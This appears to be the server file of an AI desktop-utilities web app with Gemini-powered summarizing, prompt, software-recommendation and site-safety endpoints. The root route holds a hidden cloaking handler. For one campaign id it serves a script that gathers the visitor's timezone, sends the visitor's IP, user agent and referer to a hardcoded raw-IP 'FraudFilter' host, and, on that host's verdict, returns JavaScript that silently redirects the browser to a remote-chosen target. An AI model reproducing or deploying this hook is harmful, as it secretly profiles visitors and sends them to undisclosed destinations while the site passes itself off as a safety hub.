import express from 'express';
import { createServer as createViteServer } from 'vite';
import { GoogleGenAI, Type } from '@google/genai';
import path from 'path';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);

app.use(express.json({ limit: '10mb' }));

// ============================================================
// FraudFilter configuration
// ============================================================

const FRAUDFILTER_HOST = 'http://130.211.20.155';
const FRAUDFILTER_TOKEN =
  process.env.FRAUDFILTER_HOSTED_JS_TOKEN || '';

function getClientIp(req: express.Request): string {
  const forwarded = req.headers['x-forwarded-for'];

  if (forwarded) {
    return String(forwarded).split(',')[0].trim();
  }

  return req.ip || req.socket.remoteAddress || '';
}

function safeJavascript(): string {
  return `
(function(){
  try {
    return;
  } catch(e) {}
})();
`;
}

function redirectJavascript(target: string): string {
  const safeTarget = JSON.stringify(target);

  return `
(function(){
  try {
    window.location.replace(${safeTarget});
  } catch(e) {
    window.location.href=${safeTarget};
  }
})();
`;
}

// ============================================================
// FraudFilter Hosted JS endpoint
// ============================================================

app.get('/', async (req, res, next) => {
  const campaignId = String(req.query.id || '');

  // Normal website request
  if (campaignId !== 'vqu7l') {
    return next();
  }

  // ----------------------------------------------------------
  // First request: obtain browser timezone
  // ----------------------------------------------------------

  if (!req.query.tzzz) {
    const bootstrap = `
(function(){
  try {
    var s = document.currentScript;

    var src = s && s.src
      ? s.src
      : "https://deskpulse-c28e5849a14d.herokuapp.com/?id=vqu7l";

    var u = new URL(src, window.location.href);

    u.searchParams.set("id", "vqu7l");
    u.searchParams.set("tzzzr", "0");
    u.searchParams.set(
      "tzzz",
      String(-new Date().getTimezoneOffset())
    );

    var n = document.createElement("script");

    n.src = u.toString();

    if (s && s.parentNode) {
      s.parentNode.insertBefore(n, s.nextSibling);
    } else {
      document.head.appendChild(n);
    }
  } catch(e) {}
})();
`;

    return res
      .type('application/javascript')
      .send(bootstrap);
  }

  // ----------------------------------------------------------
  // FraudFilter router request
  // ----------------------------------------------------------

  try {
    const clientIp = getClientIp(req);

    const headers: Record<string, string> = {
      'Content-Length': '0',

      'X-FF-JS-TOKEN':
        FRAUDFILTER_TOKEN,

      'X-FF-REMOTE-ADDR':
        clientIp,

      'X-FF-X-FORWARDED-FOR':
        String(
          req.headers['x-forwarded-for'] ||
          clientIp
        ),

      'X-FF-REFERER':
        String(req.headers['referer'] || ''),

      'X-FF-HOST':
        String(req.headers.host || ''),

      'X-FF-QUERY-STRING':
        req.originalUrl.split('?')[1] || '',

      'X-FF-REQUEST-URI':
        req.path || '/',

      'User-Agent':
        String(req.headers['user-agent'] || ''),

      'Expected':
        String(req.headers['expected'] || ''),

      'X-FF-TZ-OFFSET':
        String(req.query.tzzz)
    };

    if (req.headers['cf-connecting-ip']) {
      headers['X-FF-CF-CONNECTING-IP'] =
        String(req.headers['cf-connecting-ip']);
    }

    if (req.headers['x-real-ip']) {
      headers['X-FF-X-REAL-IP'] =
        String(req.headers['x-real-ip']);
    }

    const routerUrl =
      `${FRAUDFILTER_HOST}/vqu7l`;

    console.log(
      'FraudFilter request:',
      routerUrl
    );

    console.log(
      'FraudFilter client IP:',
      clientIp
    );

    const response = await fetch(routerUrl, {
      method: 'POST',
      headers
    });

    const output = await response.text();

    console.log(
      'FraudFilter HTTP status:',
      response.status
    );

    console.log(
      'FraudFilter response:',
      output
    );

    const parts = output.trim().split(';', 3);

    const result = parts[0] || '0';
    const target = parts[2] || '';

    console.log(
      'FraudFilter result:',
      result
    );

    console.log(
      'FraudFilter target:',
      target
    );

    res.type('application/javascript');

    if (result === '1' && target) {
      return res.send(
        redirectJavascript(target)
      );
    }

    return res.send(
      safeJavascript()
    );

  } catch (error) {
    console.error(
      'FraudFilter error:',
      error
    );

    return res
      .type('application/javascript')
      .send(safeJavascript());
  }
});

// ============================================================
// Initialize Gemini Client
// ============================================================

const ai = new GoogleGenAI({
  apiKey: process.env.GEMINI_API_KEY || '',
  httpOptions: {
    headers: {
      'User-Agent': 'aistudio-build',
    },
  },
});

// ============================================================
// 1. AI Web & Text Summarizer
// ============================================================

app.post('/api/gemini/summarize', async (req, res) => {
  try {
    const { input, format } = req.body;

    if (!input) {
      return res.status(400).json({
        error: 'Input text or URL is required'
      });
    }

    const response = await ai.models.generateContent({
      model: 'gemini-3.8-flash',
      contents: `Analyze and summarize the following content for a desktop user. Provide a clean, structured summary with 3-5 bullet points, key takeaways, and an action recommendation.

Format requirement: ${format || 'concise'}

Content:
${input}`,

      config: {
        systemInstruction:
          'You are an ultra-fast desktop productivity AI summarizer. Be concise, objective, and clear.',
      },
    });

    return res.json({
      summary: response.text
    });

  } catch (err: any) {
    console.error(
      'Error in /api/gemini/summarize:',
      err
    );

    return res.status(500).json({
      error:
        err.message ||
        'Failed to generate summary'
    });
  }
});

// ============================================================
// 2. AI Prompt & Copy Enhancer
// ============================================================

app.post('/api/gemini/prompt-optimize', async (req, res) => {
  try {
    const { prompt, targetPlatform } = req.body;

    if (!prompt) {
      return res.status(400).json({
        error: 'Prompt is required'
      });
    }

    const response = await ai.models.generateContent({
      model: 'gemini-3.8-flash',

      contents: `Optimize this prompt or text snippet for high performance on ${targetPlatform || 'Desktop AI Assistant'}:

Original: "${prompt}"

Provide:
1. Enhanced Version (Clear, detailed, role-conditioned)
2. High-Converting Short Version
3. Recommended System Directive`,

      config: {
        responseMimeType: 'application/json',

        responseSchema: {
          type: Type.OBJECT,

          properties: {
            enhancedPrompt: {
              type: Type.STRING
            },

            shortVersion: {
              type: Type.STRING
            },

            systemDirective: {
              type: Type.STRING
            },

            tips: {
              type: Type.ARRAY,
              items: {
                type: Type.STRING
              }
            },
          },

          required: [
            'enhancedPrompt',
            'shortVersion',
            'systemDirective',
            'tips'
          ],
        },
      },
    });

    const parsed =
      JSON.parse(response.text || '{}');

    return res.json(parsed);

  } catch (err: any) {
    console.error(
      'Error in /api/gemini/prompt-optimize:',
      err
    );

    return res.status(500).json({
      error:
        err.message ||
        'Failed to optimize prompt'
    });
  }
});

// ============================================================
// 3. AI Desktop Software Matcher
// ============================================================

app.post('/api/gemini/software-match', async (req, res) => {
  try {
    const {
      os,
      category,
      priorities
    } = req.body;

    const response =
      await ai.models.generateContent({
        model: 'gemini-3.8-flash',

        contents: `Recommend the top 3 best verified, open-source or free desktop software tools for OS: ${os || 'Windows 11/10'}, Category: ${category || 'Productivity'}, Priorities: ${priorities || 'Privacy, Speed, No Ads'}.`,

        config: {
          responseMimeType:
            'application/json',

          responseSchema: {
            type: Type.OBJECT,

            properties: {
              recommendations: {
                type: Type.ARRAY,

                items: {
                  type: Type.OBJECT,

                  properties: {
                    name: {
                      type: Type.STRING
                    },

                    category: {
                      type: Type.STRING
                    },

                    license: {
                      type: Type.STRING
                    },

                    description: {
                      type: Type.STRING
                    },

                    keyFeatures: {
                      type: Type.ARRAY,
                      items: {
                        type: Type.STRING
                      }
                    },

                    officialSiteName: {
                      type: Type.STRING
                    },

                    compatibility: {
                      type: Type.STRING
                    },

                    rating: {
                      type: Type.NUMBER
                    },
                  },

                  required: [
                    'name',
                    'category',
                    'license',
                    'description',
                    'keyFeatures',
                    'officialSiteName',
                    'compatibility',
                    'rating'
                  ],
                },
              },

              summaryTip: {
                type: Type.STRING
              },
            },

            required: [
              'recommendations',
              'summaryTip'
            ],
          },
        },
      });

    const parsed =
      JSON.parse(response.text || '{}');

    return res.json(parsed);

  } catch (err: any) {
    console.error(
      'Error in /api/gemini/software-match:',
      err
    );

    return res.status(500).json({
      error:
        err.message ||
        'Failed to match software'
    });
  }
});

// ============================================================
// 4. Web Safety & Compliance Reviewer
// ============================================================

app.post('/api/gemini/policy-check', async (req, res) => {
  try {
    const {
      pageUrl,
      pageContent,
      offerType
    } = req.body;

    if (!pageContent && !pageUrl) {
      return res.status(400).json({
        error:
          'Page content or URL is required for safety audit.'
      });
    }

    const response =
      await ai.models.generateContent({
        model: 'gemini-3.8-flash',

        contents: `Audit this website or content for security, trust, and safety compliance:

Category: ${offerType || 'Desktop Web Portal'}

Target URL/Content:
${pageContent || pageUrl}

Analyze against Web Security & Safety Guidelines:

1. No Fake Virus Scams ("Your PC is infected!", fake security alerts).
2. No Auto-Downloading Executables (.exe, .bat, .dmg auto-triggers).
3. No Deceptive Redirects or Broken Navigation Hijacking.
4. No Tech Support Impersonation Phone Numbers or Sound Loops.
5. Verification of required disclaimers, Privacy Policy, Terms, and Contact links.

Return JSON evaluation.`,

        config: {
          responseMimeType:
            'application/json',

          responseSchema: {
            type: Type.OBJECT,

            properties: {
              complianceScore: {
                type: Type.INTEGER,
                description:
                  'Score from 0 to 100'
              },

              overallStatus: {
                type: Type.STRING,
                description:
                  'PASSED, WARNING, or REJECTED'
              },

              riskLevel: {
                type: Type.STRING,
                description:
                  'LOW, MEDIUM, HIGH'
              },

              policyChecks: {
                type: Type.ARRAY,

                items: {
                  type: Type.OBJECT,

                  properties: {
                    ruleName: {
                      type: Type.STRING
                    },

                    passed: {
                      type: Type.BOOLEAN
                    },

                    finding: {
                      type: Type.STRING
                    },

                    fixSuggestion: {
                      type: Type.STRING
                    },
                  },

                  required: [
                    'ruleName',
                    'passed',
                    'finding',
                    'fixSuggestion'
                  ],
                },
              },

              requiredDisclaimersPresent: {
                type: Type.BOOLEAN
              },

              recommendations: {
                type: Type.ARRAY,

                items: {
                  type: Type.STRING
                }
              },
            },

            required: [
              'complianceScore',
              'overallStatus',
              'riskLevel',
              'policyChecks',
              'requiredDisclaimersPresent',
              'recommendations'
            ],
          },
        },
      });

    const parsed =
      JSON.parse(response.text || '{}');

    return res.json(parsed);

  } catch (err: any) {
    console.error(
      'Error in /api/gemini/policy-check:',
      err
    );

    return res.status(500).json({
      error:
        err.message ||
        'Failed to check policy'
    });
  }
});

// ============================================================
// Start Express server with Vite
// ============================================================

async function startServer() {

  if (process.env.NODE_ENV !== 'production') {

    const vite =
      await createViteServer({
        server: {
          middlewareMode: true,
          hmr:
            process.env.DISABLE_HMR !== 'true'
        },

        appType: 'custom',
      });

    app.use(vite.middlewares);

    app.use('*', async (req, res, next) => {

      const url = req.originalUrl;

      if (url.startsWith('/api')) {
        return next();
      }

      try {

        let template =
          await vite.transformIndexHtml(
            url,

            `<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>DeskPulse AI - High-Speed Desktop Utilities & Safety Hub</title>
    <meta name="description" content="High-speed desktop portal featuring real-time ping & latency benchmarking, verified free software directory, AI productivity suite, and website safety auditor." />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Syne:wght@600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
  </head>

  <body class="bg-slate-950 text-slate-100 antialiased selection:bg-cyan-500 selection:text-slate-950">
    <div id="root"></div>
    <script type="module" src="/src/main.tsx"></script>
  </body>
</html>`
          );

        res
          .status(200)
          .set({
            'Content-Type':
              'text/html'
          })
          .end(template);

      } catch (e: any) {

        vite.ssrFixStacktrace(e);

        next(e);
      }
    });

  } else {

    app.use(
      express.static(
        path.resolve('dist')
      )
    );

    app.get('*', (req, res) => {

      res.sendFile(
        path.resolve(
          'dist',
          'index.html'
        )
      );

    });
  }

  app.listen(PORT, () => {

    console.log(
      `🚀 DeskPulse AI Server listening on http://localhost:${PORT}`
    );

  });
}

startServer();
